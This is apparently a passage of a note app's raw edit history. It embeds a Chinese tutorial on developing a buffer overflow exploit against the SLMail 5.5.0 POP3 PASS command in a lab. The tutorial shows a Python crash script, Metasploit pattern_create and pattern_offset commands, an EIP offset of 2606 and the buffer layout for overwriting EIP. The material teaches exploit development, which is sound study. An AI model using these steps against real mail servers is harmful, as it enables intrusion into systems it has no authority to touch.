"]],[2310,2313],[2310,2310]]],[1576213484977,[null,[[-1,1306,"输入"],[1,1322,"输入"]],[1306,1306],[1324,1324]]],[1576213484977,[null,[[1,1306,"输入"],[-1,1320,"输入"]],[1324,1324],[1306,1306]]],[1576213427839,["whale@Whale",[[1,2310,"**"]],[2310,2310],[2312,2312]]],[1576213431252,["whale@Whale",[[1,2328,"**"]],[2328,2328],[2330,2330]]],[1576213435088,["whale@Whale",[[1,2378,"\n"]],[2377,2377],[2378,2378]]],[1576213436409,["whale@Whale",[[1,2378,"·"]],[2378,2378],[2379,2379]]],[1576213437344,["whale@Whale",[[-1,2378,"·"]],[2379,2379],[2378,2378]]],[1576213438563,["whale@Whale",[[1,2378,"```"]],[2378,2378],[2381,2381]]],[1576213442944,["whale@Whale",[[1,2476,"\n"]],[2475,2475],[2476,2476]]],[1576213443955,["whale@Whale",[[-1,2476,"\n"],[1,2477,"```"]],[2476,2476],[2479,2479]]],[1576213477488,["whale@Whale",[[1,2479,"\n\n"]],[2479,2479],[2480,2480]]],[1576213546009,[null,[[-1,1306,"输入"],[1,1322,"输入"]],[1306,1306],[1324,1324]]],[1576213546010,[null,[[1,1306,"输入"],[-1,1320,"输入"]],[1324,1324],[1306,1306]]],[1576213485813,["whale@Whale",[[1,2481,"![21]($res/21.PNG)\n\n"]],[2480,2480],[2500,2500]]],[1576213501624,["whale@Whale",[[-1,2480,"\n"]],[2480,2480],[2479,2479]]],[1576213519345,["whale@Whale",[[1,2231,"c"]],[2231,2231],[2232,2232]]],[1576213520289,["whale@Whale",[[-1,2231,"c"]],[2232,2232],[2231,2231]]],[1576213523139,["whale@Whale",[[1,2231,"从"]],[2231,2231],[2232,2232]]],[1576213606006,[null,[[-1,1306,"输入"],[1,1322,"输入"]],[1306,1306],[1324,1324]]],[1576213606007,[null,[[1,1306,"输入"],[-1,1320,"输入"]],[1324,1324],[1306,1306]]],[1576213596975,["whale@Whale",[[1,2484,"2]($res/22.PNG)\n\n![2"]],[2500,2500],[2500,2500]]],[1576213603212,["whale@Whale",[[-1,2481,"![22]($res/22.PNG)\n"]],[2481,2500],[2481,2481]]],[1576213605133,["whale@Whale",[[1,2501,"![22]($res/22.PNG)\n"]],[2501,2501],[2520,2520]]],[1576213665991,[null,[[-1,1306,"输入"],[1,1322,"输入"]],[1306,1306],[1324,1324]]],[1576213665991,[null,[[1,1306,"输入"],[-1,1320,"输入"]],[1324,1324],[1306,1306]]],[1576213608135,["whale@Whale",[[1,2501,"\n"]],[2500,2500],[2501,2501]]],[1576213608446,["whale@Whale",[[1,2502,"\n"]],[2501,2501],[2502,2502]]],[1576213618558,["whale@Whale",[[1,2502,"复制生成的"]],[2502,2502],[2507,2507]]],[1576213787015,[null,[[-1,1306,"输入"],[1,1322,"输入"]],[1306,1306],[1324,1324]]],[1576213787015,[null,[[1,1306,"输入"],[-1,1320,"输入"]],[1324,1324],[1306,1306]]],[1576213748390,["whale@Whale",[[1,2507,"字符串"]],[2507,2507],[2510,2510]]],[1576213768495,["whale@Whale",[[-1,2481,"\n"]],[2481,2481],[2480,2480]]],[1576214091014,[null,[[-1,1306,"输入"],[1,1322,"输入"]],[1306,1306],[1324,1324]]],[1576214091015,[null,[[1,1306,"输入"],[-1,1320,"输入"]],[1324,1324],[1306,1306]]],[1576214046749,["whale@Whale",[[1,2509,"，修改send.py"]],[2509,2509],[2519,2519]]],[1576214084591,["whale@Whale",[[1,695,"gen"]],[695,695],[698,698]]],[1576214085662,["whale@Whale",[[-1,695,"gen"]],[698,698],[695,695]]],[1576214089247,["whale@Whale",[[1,695,"根据这个脚本"]],[695,695],[701,701]]],[1576214151011,[null,[[-1,1312,"输入"],[1,1328,"输入"]],[1312,1312],[1330,1330]]],[1576214151011,[null,[[1,1312,"输入"],[-1,1326,"输入"]],[1330,1330],[1312,1312]]],[1576214096412,["whale@Whale",[[1,2525,"s.send('PASS ' + string + '\\r\\n')"]],[2525,2525],[2558,2558]]],[1576214097941,["whale@Whale",[[-1,2525,"s.send('PASS ' + string + '\\r\\n')"]],[2558,2558],[2525,2525]]],[1576214109747,["whale@Whale",[[1,2525,"https://github.com/Whale3070/ctf-coding/blob/master/send.py"]],[2525,2525],[2584,2584]]],[1576214115002,["whale@Whale",[[1,2525,"】"]],[2525,2525],[2526,2526]]],[1576214116443,["whale@Whale",[[-1,2525,"】"]],[2526,2526],[2525,2525]]],[1576214119934,["whale@Whale",[[1,2525,"]("]],[2525,2525],[2527,2527]]],[1576214123944,["whale@Whale",[[1,2586,"）"]],[2586,2586],[2587,2587]]],[1576214124633,["whale@Whale",[[1,2588,"\n"]],[2587,2587],[2588,2588]]],[1576214129511,["whale@Whale",[[1,2518,"["]],[2518,2518],[2519,2519]]],[1576214134458,["whale@Whale",[[-1,2526,"]"]],[2527,2527],[2526,2526]]],[1576214138101,["whale@Whale",[[1,2526,"]"]],[2526,2526],[2527,2527]]],[1576214211014,[null,[[-1,1312,"输入"],[1,1328,"输入"]],[1312,1312],[1330,1330]]],[1576214211014,[null,[[1,1312,"输入"],[-1,1326,"输入"]],[1330,1330],[1312,1312]]],[1576214151720,["whale@Whale",[[1,2518,"\n"]],[2518,2518],[2519,2519]]],[1576214153793,["whale@Whale",[[1,2519,"\n"]],[2519,2519],[2520,2520]]],[1576214155427,["whale@Whale",[[-1,2520,"["]],[2520,2520],[2520,2520]]],[1576214156479,["whale@Whale",[[1,2520,"["]],[2520,2520],[2521,2521]]],[1576214162519,["whale@Whale",[[1,2529," "]],[2529,2529],[2530,2530]]],[1576214163426,["whale@Whale",[[-1,2529," "]],[2530,2530],[2529,2529]]],[1576214166962,["whale@Whale",[[-1,2589,"）"]],[2590,2590],[2589,2589]]],[1576214168138,["whale@Whale",[[1,2589,")"]],[2589,2589],[2590,2590]]],[1576214171706,["whale@Whale",[[-1,2519,"\n"]],[2519,2519],[2518,2518]]],[1576214172714,["whale@Whale",[[-1,2518,"\n"]],[2518,2518],[2518,2518]]],[1576214200919,["whale@Whale",[[1,2588,"，将字符串发送"]],[2588,2588],[2595,2595]]],[1576214202199,["whale@Whale",[[-1,2593,"发送"]],[2595,2595],[2593,2593]]],[1576214207845,["whale@Whale",[[1,2593,"作为pass密码发送。"]],[2593,2593],[2604,2604]]]]],["cdf79263-a163-4130-906e-1271e31d2498",1576215410060,"缓冲区溢出案例与exp开发流程\n===\n- bug是怎么找到的?\n- 你怎么知道x比特在y命令，可以使应用程序崩溃造成缓冲区溢出漏洞？\n有三种方法：1. 如果有源代码，阅读源码是最简单的寻找bug的方式。\n2. 逆向工程\n3. fuzzing\n---\nfuzzing 是一种向应用程序发送构造的数据，然后期盼程序崩溃。\n程序崩溃说明程序没有对输入做正确的过滤。\n## 漏洞历史\n下面讲一下在slmail 5.5.0 邮件服务软件上的知名缓冲区溢出漏洞。\n在2005年发现，pop3 pass命令，在用户登陆的时候，有bof漏洞。攻击者无需知道\n任何口令即可引发bof漏洞。\n该软件未使用DEP或者ASLR编译，使得漏洞利用过程更加简单，我们不必绕过这些内部安全机制。\n## DEP和ASLR\n这是微软的内存保护机制。\nDEP是一系列硬件、软件技术，执行额外的内存检查，防止恶意代码在程序上运行。\nDEP主要的好处是当发生异常时，防止代码从数据区执行。\nASLR打乱载入应用程序、动态链接库时候的基地址（base address)\n## 与pop3协议通信\n我们选择slmail作为案例的原因是，与纯文本pop3协议通信十分简单。\n我们可以使用netcat与pop3服务器进行通信。\n\nhttps://slmail.software.informer.com/5.5/\n安装exe到windows，重启后，windows开放了pop3-110端口 \n\n![16]($res/16.PNG)\n\n## 写一个python脚本\n这个脚本的作用很简单，和nc起到的作用一样。为什么要写这个脚本呢?因为根据这个脚本稍作修改，就可以改为fuzzer脚本，使得应用程序崩溃。\n![15]($res/15.PNG)\n\n[https://github.com/Whale3070/ctf-coding/blob/master/send.py](https://github.com/Whale3070/ctf-coding/blob/master/send.py)\n\n[https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py](https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py)\n\n## immunity debugger\n![18]($res/18.PNG)\n\n左上 --指令面板\n\n右上 ==寄存器面板\n\n左下 --内存转储面板\n\n右下 --堆栈面板\n\n---\nfile -- attach --SLmail\n![17]($res/17.PNG)\n\n挂载后，点击下图的开始按钮，运行程序\n![20]($res/20.PNG)\n\n运行[fuzzer.py](https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py)，使程序崩溃，造成了缓冲区溢出\n\n![19]($res/19.PNG)\n\n## 定位缓冲区大小\n定位缓冲区大小，当输入2500个a，程序运行正常；输入2600个a时候，就会报错。\n```\n#!/usr/bin/python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbuffer= 'a' * 2700\ntry:\n\tprint \"\\nSending evil buffer...\"\n\ts.connect(('192.168.1.102',110)) # connect to IP, POP3 port\n\tdata = s.recv(1024) # receive banner\n\tprint data # print banner\n\t\n\ts.send('USER test' +'\\r\\n') # send username \"test\"\n\tdata = s.recv(1024) # receive reply\n\tprint data # print reply\n\t\n\ts.send('PASS' + buffer + '\\r\\n') # send password \"test\"\n\tdata = s.recv(1024)\n\tprint data # print reply\n\t\n\ts.close() # close socket\n\tprint \"\\nDone!\"\nexcept:\n\tprint \"Could not connect to POP3!\"\n```\n## 控制eip\n\n控制eip寄存器是exp开发流程中关键的有，eip寄存器就像驾驭马的辔头一样，控制缰绳就让应用程序前进，\n拉着缰绳就能让它改变前进方向。所以我们使用4个A在buffer(缓冲区)中覆盖了EIP，这里有两个常见的方法：\n### 二叉树分析\n将2700个A修改为，发送1350A和1350个B，如果EIP被B所覆盖，我们知道了4比特存在于buffer的第二部分。\n接下来，修改1350个B为675个B和675个C，然后再一次发送buffer。\n如果EIP被C覆盖，我们知道了4bit存在于2000-2700比特范围之间。\n我们继续将buffer二分直到我们知道了准确的覆盖EIP的4bit。\n从数学上来说，这将在7次之内找到。\n### 发送一个特殊的字符串\n最快的方式是发送一个特殊的字符，来确认覆盖EIP的范围，然后在buffer中查找这个字符。\n\n**patter_create.rb**\n\n是一个ruby工具，来创建和定位这样的buffer，并且可以在msf中找到它。\n使用方法：\n```\nlocate pattern_create\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700\n```\n![21]($res/21.PNG)\n\n复制生成的字符串，修改[send.py](https://github.com/Whale3070/ctf-coding/blob/master/send.py)，将字符串作为pass密码发送。\n\n![22]($res/22.PNG)\n\n",[[1576215359780,["whale@Whale",[[1,2626,"\n"]],[2625,2625],[2626,2626]]],[1576215359911,["whale@Whale",[[1,2627,"\n"]],[2626,2626],[2627,2627]]],[1576215369459,["whale@Whale",[[1,2609,"3]($res/23.PNG)\n\n![2"]],[2627,2627],[2625,2625]]],[1576215373503,["whale@Whale",[[-1,2606,"![23]($res/23.PNG)\n"]],[2606,2625],[2606,2606]]],[1576215374970,["whale@Whale",[[-1,2606,"\n"]],[2606,2606],[2605,2605]]],[1576215375433,["whale@Whale",[[-1,2605,"\n"]],[2605,2605],[2604,2604]]],[1576215376752,["whale@Whale",[[1,2627,"\n"]],[2623,2623],[2624,2624]]],[1576215376956,["whale@Whale",[[1,2628,"\n"]],[2624,2624],[2625,2625]]],[1576215378142,["whale@Whale",[[1,2625,"![23]($res/23.PNG)\n"]],[2625,2625],[2644,2644]]],[1576215382949,["whale@Whale",[[1,2625,"\n"]],[2624,2624],[2625,2625]]],[1576215398349,["whale@Whale",[[1,2625,"执行send3.py"]],[2625,2625],[2635,2635]]],[1576215412931,["whale@Whale",[[1,2636,"\n"]],[2635,2635],[2636,2636]]],[1576215418754,["whale@Whale",[[-1,2632,"."]],[2633,2633],[2632,2632]]],[1576215420553,["whale@Whale",[[1,2632,"."]],[2632,2632],[2633,2633]]],[1576215421419,["whale@Whale",[[-1,2632,"."]],[2633,2633],[2632,2632]]],[1576215767957,["whale@Whale",[[1,74,"\n"]],[74,74],[75,75]]],[1576215770500,["whale@Whale",[[1,123,"\n"]],[123,123],[124,124]]],[1576215777150,["whale@Whale",[[-1,75,"1."]],[75,75],[75,75]]],[1576215778083,["whale@Whale",[[1,75,"-"]],[75,75],[76,76]]],[1576215781970,["whale@Whale",[[-1,75,"-"]],[76,76],[75,75]]],[1576215783694,["whale@Whale",[[1,75,"1."]],[75,75],[77,77]]],[1576215787067,["whale@Whale",[[1,68,"\n"]],[68,68],[69,69]]],[1576215844568,["whale@Whale",[[1,2659,"39694438"]],[2659,2659],[2667,2667]]],[1576216789211,["whale@Whale",[[1,2607,"修改python脚本，将这个输入到buffer中，而不是2700个A，注意下一次程序崩溃时，ESP和EIP寄存器中的值\r\n"]],[2607,2607],[2668,2668]]],[1576216799457,["whale@Whale",[[-1,2607,"修改python脚本，将这个输入到buffer中，"],[-1,2606,"。\r"]],[2607,2632],[2606,2606]]],[1576216800551,["whale@Whale",[[1,2606,","]],[2606,2606],[2607,2607]]],[1576216801365,["whale@Whale",[[-1,2606,","]],[2607,2607],[2606,2606]]],[1576216802800,["whale@Whale",[[1,2606,"，"]],[2606,2606],[2607,2607]]],[1576220448986,[null,[[-1,2607,"。改python脚本，将这个输入到buffer中，"],[-1,2666,"\r"]],[2607,2607],[2666,2666]]],[1576220448986,[null,[[1,2607,"。改python脚本，将这个输入到buffer中，"],[1,2641,"\r"]],[2666,2666],[2607,2607]]],[1576220416008,["whale@Whale",[[1,2704,"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 -q 39694438\n"]],[2704,2704],[2788,2788]]],[1576220418644,["whale@Whale",[[-1,2779,"\n"]],[2779,2779],[2779,2779]]],[1576220509017,[null,[[-1,2607,"。改python脚本，将这个输入到buffer中，"],[-1,2666,"\r"],[1,2704,"]($res/23.PNG)\n\n39694438\n\n"],[-1,2779,"9694438\n]($res/23.PNG)\n\n"],[-1,2812,"\n\n"]],[2607,2607],[2812,2812]]],[1576220509017,[null,[[1,2607,"。改python脚本，将这个输入到buffer中，"],[1,2641,"\r"],[-1,2678,"]($res/23.PNG)\n\n39694438\n\n"],[1,2779,"9694438\n]($res/23.PNG)\n\n"],[1,2788,"\n\n"]],[2812,2812],[2607,2607]]],[1576220472219,["whale@Whale",[[1,2704,"\n"]],[2703,2703],[2704,2704]]],[1576220479975,["whale@Whale",[[1,2704,"locate pattern_offset.rb"]],[2704,2704],[2728,2728]]],[1576220480439,["whale@Whale",[[1,2729,"\n"]],[2728,2728],[2729,2729]]],[1576220493341,["whale@Whale",[[1,2729,"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -p 39694438"]],[2729,2729],[2812,2812]]],[1576220568989,[null,[[-1,2607,"。改python脚本，将这个输入到buffer中，"],[-1,2666,"\r"],[1,2704,"]($res/23.PNG)\n\n39694438\n\n"],[-1,2888,"9694438\n]($res/23.PNG)\n\n"],[-1,2921,"\n\n"]],[2607,2607],[2921,2921]]],[1576220568989,[null,[[1,2607,"。改python脚本，将这个输入到buffer中，"],[1,2641,"\r"],[-1,2678,"]($res/23.PNG)\n\n39694438\n\n"],[1,2888,"9694438\n]($res/23.PNG)\n\n"],[1,2897,"\n\n"]],[2921,2921],[2607,2607]]],[1576220520853,["whale@Whale",[[-1,2802,"p"]],[2803,2803],[2802,2802]]],[1576220521271,["whale@Whale",[[1,2802,"q"]],[2802,2802],[2803,2803]]],[1576220530588,["whale@Whale",[[-1,2813,"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 -q 39694438"]],[2813,2896],[2813,2813]]],[1576220535224,["whale@Whale",[[1,2704,"\n"]],[2703,2703],[2704,2704]]],[1576220538348,["whale@Whale",[[1,2704,"```"]],[2704,2704],[2707,2707]]],[1576220539686,["whale@Whale",[[-1,2817,"\n"],[1,2818,"```"]],[2817,2817],[2820,2820]]],[1576220553977,["whale@Whale",[[1,2692,"zh"]],[2692,2692],[2694,2694]]],[1576220554441,["whale@Whale",[[-1,2692,"zh"]],[2694,2694],[2692,2692]]],[1576220565358,["whale@Whale",[[1,2692,"注意弹框的地址`"]],[2692,2692],[2700,2700]]],[1576220566565,["whale@Whale",[[-1,2701,"\n"]],[2700,2700],[2700,2700]]],[1576220566983,["whale@Whale",[[-1,2700,"\n"]],[2700,2700],[2700,2700]]],[1576220567385,["whale@Whale",[[1,2700,"`"]],[2700,2700],[2701,2701]]],[1576220568163,["whale@Whale",[[-1,2700,"`"]],[2701,2701],[2700,2700]]],[1576220629032,[null,[[-1,2607,"。改python脚本，将这个输入到buffer中，"],[-1,2666,"\r"],[1,2692,"end3py\n\n![23]($res/23.PNG)"],[-1,2700,"d3py"],[1,2704,"39694438"],[-1,2706,"![23"],[-1,2826,"($res/23.PNG)\n\n39694438\n\n\n"],[1,2852,""]],[2607,2607],[2852,2852]]],[1576220629032,[null,[[1,2607,"。改python脚本，将这个输入到buffer中，"],[1,2641,"\r"],[-1,2666,"end3py\n\n![23]($res/23.PNG)"],[1,2700,"d3py"],[-1,2700,"39694438"],[1,2710,"![23"],[1,2826,"($res/23.PNG)\n\n39694438\n\n\n"],[-1,2826,""]],[2852,2852],[2607,2607]]],[1576220603081,["whale@Whale",[[1,2824,"\n"]],[2823,2823],[2824,2824]]],[1576220603255,["whale@Whale",[[1,2825,"\n"]],[2824,2824],[2825,2825]]],[1576220604225,["whale@Whale",[[1,2825,"[*] Exact match at offset 2606"]],[2825,2825],[2855,2855]]],[1576220607167,["whale@Whale",[[1,2859,"\n\n"]],[2859,2859],[2860,2860]]],[1576220607390,["whale@Whale",[[1,2861,"\n"]],[2860,2860],[2861,2861]]],[1576220609840,["whale@Whale",[[1,2860,"yun"]],[2860,2860],[2863,2863]]],[1576220610379,["whale@Whale",[[-1,2860,"yun"]],[2863,2863],[2860,2860]]],[1576220613019,["whale@Whale",[[1,2860,"运行后得知"]],[2860,2860],[2865,2865]]],[1576220625536,["whale@Whale",[[-1,2860,"运行后得知"]],[2865,2865],[2860,2860]]],[1576220689988,[null,[[-1,2607,"。改python脚本，将这个输入到buffer中，"],[-1,2666,"\r"],[1,2692,"end3py\n\n![23]($res/23.PNG)"],[-1,2700,"d3py"],[1,2704,"39694438`"],[-1,2706,"![23"],[-1,2823,"`"],[1,2824,""],[-1,2858,"(\n\n\n$res/23.PNG)\n\n39694438"],[1,2884,"`"]],[2607,2607],[2885,2885]]],[1576220689988,[null,[[1,2607,"。改python脚本，将这个输入到buffer中，"],[1,2641,"\r"],[-1,2666,"end3py\n\n![23]($res/23.PNG)"],[1,2700,"d3py"],[-1,2700,"39694438`"],[1,2711,"![23"],[1,2824,"`"],[-1,2824,""],[1,2858,"(\n\n\n$res/23.PNG)\n\n39694438"],[-1,2858,"`"]],[2885,2885],[2607,2607]]],[1576220629898,["whale@Whale",[[1,2860,"yun"]],[2860,2860],[2863,2863]]],[1576220631720,["whale@Whale",[[-1,2860,"yun"]],[2863,2863],[2860,2860]]],[1576220638792,["whale@Whale",[[1,2272,"()"]],[2272,2272],[2274,2274]]],[1576220642905,["whale@Whale",[[1,2273,"使用msf"]],[2273,2273],[2278,2278]]],[1576220644812,["whale@Whale",[[-1,2278,")"]],[2279,2279],[2278,2278]]],[1576220647979,["whale@Whale",[[1,2278,")））"]],[2278,2278],[2281,2281]]],[1576220650338,["whale@Whale",[[-1,2278,")）"]],[2280,2280],[2278,2278]]],[1576220660312,["whale@Whale",[[1,2867,"；"]],[2867,2867],[2868,2868]]],[1576220660948,["whale@Whale",[[-1,2867,"；"]],[2868,2868],[2867,2867]]],[1576220662513,["whale@Whale",[[1,2867,"yus"]],[2867,2867],[2870,2870]]],[1576220663328,["whale@Whale",[[-1,2867,"yus"]],[2870,2870],[2867,2867]]],[1576220673406,["whale@Whale",[[1,2867,"于是得知了offset为2606"]],[2867,2867],[2883,2883]]],[1576220675217,["whale@Whale",[[1,2885,"\n"]],[2883,2883],[2884,2884]]],[1576220675505,["whale@Whale",[[1,2886,"\n"]],[2884,2884],[2885,2885]]],[1576228858998,[null,[[-1,2614,"。改python脚本，将这个输入到buffer中，"],[-1,2673,"\r"],[1,2699,"end3py\n\n![23]($res/23.PNG)"],[-1,2707,"d3py"],[1,2711,"39694438`"],[-1,2713,"![23"],[-1,2830,"`"],[1,2831,""],[-1,2865,"("],[1,2866,"`"],[-1,2887,"$res/23.PNG)\n\n39694438\n\n\n"]],[2614,2614],[2887,2887]]],[1576228858998,[null,[[1,2614,"。改python脚本，将这个输入到buffer中，"],[1,2648,"\r"],[-1,2673,"end3py\n\n![23]($res/23.PNG)"],[1,2707,"d3py"],[-1,2707,"39694438`"],[1,2718,"![23"],[1,2831,"`"],[-1,2831,""],[1,2865,"("],[-1,2865,"`"],[1,2887,"$res/23.PNG)\n\n39694438\n\n\n"]],[2887,2887],[2614,2614]]],[1576228842811,["whale@Whale",[[1,2885,"## "]],[2885,2885],[2888,2888]]],[1576228843389,["whale@Whale",[[1,2890,"\n"]],[2888,2888],[2889,2889]]],[1576228848095,["whale@Whale",[[1,2889,"知道EIP地址知乎"]],[2889,2889],[2898,2898]]],[1576228848769,["whale@Whale",[[-1,2896,"知乎"]],[2898,2898],[2896,2896]]],[1576228849785,["whale@Whale",[[1,2896,"之后"]],[2896,2896],[2898,2898]]],[1576229520010,[null,[[-1,2614,"。改python脚本，将这个输入到buffer中，"],[-1,2673,"\r"],[1,2699,"end3py\n\n![23]($res/23.PNG)"],[-1,2707,"d3py"],[1,2711,"39694438`"],[-1,2713,"![23"],[-1,2830,"`"],[1,2831,""],[-1,2865,"("],[1,2866,"`"],[-1,2898,"\n\n$res/23.PNG)\n\n39694438\n"],[1,2923,""]],[2614,2614],[2923,2923]]],[1576229520010,[null,[[1,2614,"。改python脚本，将这个输入到buffer中，"],[1,2648,"\r"],[-1,2673,"end3py\n\n![23]($res/23.PNG)"],[1,2707,"d3py"],[-1,2707,"39694438`"],[1,2718,"![23"],[1,2831,"`"],[-1,2831,""],[1,2865,"("],[-1,2865,"`"],[1,2898,"\n\n$res/23.PNG)\n\n39694438\n"],[-1,2898,""]],[2923,2923],[2614,2614]]],[1576229469927,["whale@Whale",[[1,2888,"## 检查buffer，准备执行shellcode"]],[2888,2888],[2913,2913]]],[1576229472805,["whale@Whale",[[-1,2888,"## "]],[2888,2891],[2888,2888]]],[1576231349023,[null,[[-1,2614,"。改python脚本，将这个输入到buffer中，"],[-1,2673,"\r"],[1,2699,"end3py\n\n![23]($res/23.PNG)"],[-1,2707,"d3py"],[1,2711,"39694438`"],[-1,2713,"![23"],[-1,2830,"`"],[1,2831,""],[-1,2865,"("],[1,2866,"`"],[-1,2920,"\n\n$res/23.PNG)\n\n39694438\n"],[1,2945,""]],[2614,2614],[2945,2945]]],[1576231349023,[null,[[1,2614,"。改python脚本，将这个输入到buffer中，"],[1,2648,"\r"],[-1,2673,"end3py\n\n![23]($res/23.PNG)"],[1,2707,"d3py"],[-1,2707,"39694438`"],[1,2718,"![23"],[1,2831,"`"],[-1,2831,""],[1,2865,"("],[-1,2865,"`"],[1,2920,"\n\n$res/23.PNG)\n\n39694438\n"],[-1,2920,""]],[2945,2945],[2614,2614]]],[1576231302746,["whale@Whale",[[-1,1060,"=="]],[1062,1062],[1060,1060]]],[1576231303700,["whale@Whale",[[1,1060,"--"]],[1060,1060],[1062,1062]]],[1576233177014,[null,[[-1,2614,"。改python脚本，将这个输入到buffer中，"],[-1,2673,"\r"],[1,2699,"end3py\n\n![23]($res/23.PNG)"],[-1,2707,"d3py"],[1,2711,"39694438`"],[-1,2713,"![23"],[-1,2830,"`"],[1,2831,""],[-1,2865,"("],[1,2866,"`"],[-1,2920,"\n\n$res/23.PNG)\n\n39694438\n"],[1,2945,""]],[2614,2614],[2945,2945]]],[1576233177015,[null,[[1,2614,"。改python脚本，将这个输入到buffer中，"],[1,2648,"\r"],[-1,2673,"end3py\n\n![23]($res/23.PNG)"],[1,2707,"d3py"],[-1,2707,"39694438`"],[1,2718,"![23"],[1,2831,"`"],[-1,2831,""],[1,2865,"("],[-1,2865,"`"],[1,2920,"\n\n$res/23.PNG)\n\n39694438\n"],[-1,2920,""]],[2945,2945],[2614,2614]]],[1576233124057,["whale@Whale",[[1,2922,"![24]($res/24.PNG)\n\n"]],[2921,2921],[2941,2941]]],[1576233132170,["whale@Whale",[[-1,2941,"\n"],[1,2942,"修改eip地址"]],[2941,2941],[2948,2948]]],[1576233141065,["whale@Whale",[[-1,2943,"eip地址"]],[2948,2948],[2943,2943]]],[1576233153732,["whale@Whale",[[1,2943,"buffer，string= \"A\"* 2606+ \"B\"*4 + \"C\"*(3500-2606-4)"]],[2943,2943],[2994,2994]]],[1576233155263,["whale@Whale",[[1,2950,"·"]],[2950,2950],[2951,2951]]],[1576233157072,["whale@Whale",[[-1,2950,"·"]],[2951,2951],[2950,2950]]],[1576233158029,["whale@Whale",[[1,2950,"`"]],[2950,2950],[2951,2951]]],[1576233158541,["whale@Whale",[[1,2995,"`"]],[2995,2995],[2996,2996]]],[1576233236996,[null,[[-1,2614,"。改python脚本，将这个输入到buffer中，"],[-1,2673,"\r"],[1,2699,"end3py\n\n![23]($res/23.PNG)"],[-1,2707,"d3py"],[1,2711,"39694438`"],[-1,2713,"![23"],[-1,2830,"`"],[1,2831,""],[-1,2865,"("],[1,2866,"`"],[-1,2996,"$res/23.PNG)\n\n39694438\n\n\n"],[1,3021,""]],[2614,2614],[3021,3021]]],[1576233236996,[null,[[1,2614,"。改python脚本，将这个输入到buffer中，"],[1,2648,"\r"],[-1,2673,"end3py\n\n![23]($res/23.PNG)"],[1,2707,"d3py"],[-1,2707,"39694438`"],[1,2718,"![23"],[1,2831,"`"],[-1,2831,""],[1,2865,"("],[-1,2865,"`"],[1,2996,"$res/23.PNG)\n\n39694438\n\n\n"],[-1,2996,""]],[3021,3021],[2614,2614]]],[1576233202968,["whale@Whale",[[1,2996,"\n\n"]],[2996,2996],[2997,2997]]],[1576233203191,["whale@Whale",[[1,2998,"\n"]],[2997,2997],[2998,2998]]],[1576233204364,["whale@Whale",[[-1,2998,"\n"],[1,2999,"j"]],[2998,2998],[2999,2999]]],[1576233205029,["whale@Whale",[[-1,2998,"j"]],[2999,2999],[2998,2998]]],[1576233205395,["whale@Whale",[[-1,2997,"\n"],[1,2998,"j"]],[2998,2998],[2997,2998]]],[1576233205711,["whale@Whale",[[1,2998,"'a"]],[2997,2998],[2997,3000]]],[1576233206195,["whale@Whale",[[-1,2998,"'a"]],[2997,3000],[2997,2998]]],[1576233206391,["whale@Whale",[[-1,2997,"j"]],[2997,2998],[0,0]]],[1576233215263,["whale@Whale",[[1,2997,"\n"]],[2996,2996],[2997,2997]]],[1576233215455,["whale@Whale",[[1,2998,"\n"]],[2997,2997],[2998,2998]]],[1576233221189,["whale@Whale",[[-1,2998,"\n"],[1,2999,"将2700自己"]],[2998,2998],[3005,3005]]],[1576233222407,["whale@Whale",[[-1,3003,"自己"]],[3005,3005],[3003,3003]]],[1576233236932,["whale@Whale",[[1,3003,"字节的buffer字符串修改为"]],[3003,3003],[3018,3018]]],[1576233297019,[null,[[-1,2614,"。改python脚本，将这个输入到buffer中，"],[-1,2673,"\r"],[1,2699,"end3py\n\n![23]($res/23.PNG)"],[-1,2707,"d3py"],[1,2711,"39694438`"],[-1,2713,"![23"],[-1,2830,"`"],[1,2831,""],[-1,2865,"("],[1,2866,"`"],[-1,3018,"$res/23.PNG)\n\n39694438\n\n\n"],[1,3043,""]],[2614,2614],[3043,3043]]],[1576233297019,[null,[[1,2614,"。改python脚本，将这个输入到buffer中，"],[1,2648,"\r"],[-1,2673,"end3py\n\n![23]($res/23.PNG)"],[1,2707,"d3py"],[-1,2707,"39694438`"],[1,2718,"![23"],[1,2831,"`"],[-1,2831,""],[1,2865,"("],[-1,2865,"`"],[1,3018,"$res/23.PNG)\n\n39694438\n\n\n"],[-1,3018,""]],[3043,3043],[2614,2614]]],[1576233238943,["whale@Whale",[[1,3018,"35"]],[3018,3018],[3020,3020]]],[1576233240967,["whale@Whale",[[-1,3017,"为35"]],[3020,3020],[3017,3017]]],[1576233242732,["whale@Whale",[[1,3017,"为35"]],[3017,3017],[3020,3020]]],[1576233243742,["whale@Whale",[[-1,3018,"35"]],[3020,3020],[3018,3018]]],[1576233250553,["whale@Whale",[[1,3018,"共3500字节的"]],[3018,3018],[3026,3026]]],[1576233254602,["whale@Whale",[[-1,3025,"的"]],[3026,3026],[3025,3025]]],[1576233255520,["whale@Whale",[[1,3025,"，"]],[3025,3025],[3026,3026]]],[1576233721011,[null,[[-1,2614,"。改python脚本，将这个输入到buffer中，"],[-1,2673,"\r"],[1,2699,"end3py\n\n![23]($res/23.PNG)"],[-1,2707,"d3py"],[1,2711,"39694438`"],[-1,2713,"![23"],[-1,2830,"`"],[1,2831,""],[-1,2865,"("],[1,2866,"`"],[-1,3026,"$res/23.PNG)\n\n39694438\n\n\n"],[1,3051,""]],[2614,2614],[3051,3051]]],[1576233721011,[null,[[1,2614,"。改python脚本，将这个输入到buffer中，"],[1,2648,"\r"],[-1,2673,"end3py\n\n![23]($res/23.PNG)"],[1,2707,"d3py"],[-1,2707,"39694438`"],[1,2718,"![23"],[1,2831,"`"],[-1,2831,""],[1,2865,"("],[-1,2865,"`"],[1,3026,"$res/23.PNG)\n\n39694438\n\n\n"],[-1,3026,""]],[3051,3051],[2614,2614]]],[1576233672678,["whale@Whale",[[1,3026,"成功覆盖"]],[3026,3026],[3030,3030]]],[1576233781998,[null,[[-1,2614,"。改python脚本，将这个输入到buffer中，"],[-1,2673,"\r"],[1,2699,"end3py\n\n![23]($res/23.PNG)"],[-1,2707,"d3py"],[1,2711,"39694438`"],[-1,2713,"![23"],[-1,2830,"`"],[1,2831,""],[-1,2865,"("],[1,2866,"`"],[-1,3030,"$res/23.PNG)\n\n39694438\n\n\n"],[1